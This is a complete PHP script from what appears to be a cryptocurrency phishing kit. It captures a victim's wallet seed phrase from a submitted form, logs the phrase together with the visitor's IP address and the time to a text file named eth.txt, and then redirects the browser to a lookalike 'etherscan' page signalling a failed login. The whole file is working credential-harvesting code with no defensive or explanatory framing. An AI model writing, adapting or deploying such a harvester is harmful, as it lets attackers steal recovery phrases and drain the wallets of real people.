<?php
$file = "eth.txt";
$seed = $_POST['seed'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');
fwrite($handle, "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
fwrite($handle, "\n");
fwrite($handle, "Phrase : ");
fwrite($handle, "$seed");
fwrite($handle, "\n");
fwrite($handle, "IP  : ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
echo "<script images=\"JavaScript\">
<!--
window.location=\"https://etherscan-hold.github.io/scan/true.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";
// -->
</script>";
?>
